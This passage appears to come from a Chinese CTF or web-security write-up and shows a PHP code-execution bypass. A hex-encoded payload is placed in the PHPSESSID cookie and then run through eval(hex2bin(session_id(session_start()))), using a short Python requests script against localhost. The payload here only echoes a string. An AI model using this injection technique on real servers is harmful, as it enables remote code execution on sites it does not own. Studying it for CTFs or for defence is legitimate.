法五：session_id()

之前我们从$_FILES入手，这里还能从$_COOKIE入手：

我们有函数

可以获取PHPSESSID的值，而我们知道PHPSESSID允许字母和数字出现，那么就有了新的思路，即hex2bin

同样是一叶飘零大佬的脚本

import requests
url = 'http://localhost/?code=eval(hex2bin(session_id(session_start())));'
payload = "echo 'sky cool';".encode('hex')
cookies = {
    'PHPSESSID':payload
}
r = requests.get(url=url,cookies=cookies)
print r.content
